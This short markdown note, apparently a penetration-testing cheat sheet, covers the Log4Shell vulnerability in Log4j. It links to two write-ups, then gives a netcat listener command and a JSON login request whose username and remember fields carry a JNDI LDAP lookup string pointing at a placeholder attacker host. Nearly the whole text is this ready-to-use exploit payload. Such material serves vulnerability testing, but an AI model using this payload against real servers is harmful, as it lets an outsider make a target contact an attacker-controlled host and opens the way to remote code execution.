## info
general info: https://0xcybery.github.io/blog/Log4Shell  
more detailed: https://www.lunasec.io/docs/blog/log4shell-live-patch-technical/

## testing

run netcat listener:
```bash
nc -nlvp 443
```
use payload in request e.g.:
```json
{
	"username":"${jndi:ldap://YOUR-IP:443}",
	"password":"qwdqwd",
	"remember":"${jndi:ldap://YOUR-IP:443}",
	"strict":true
}
```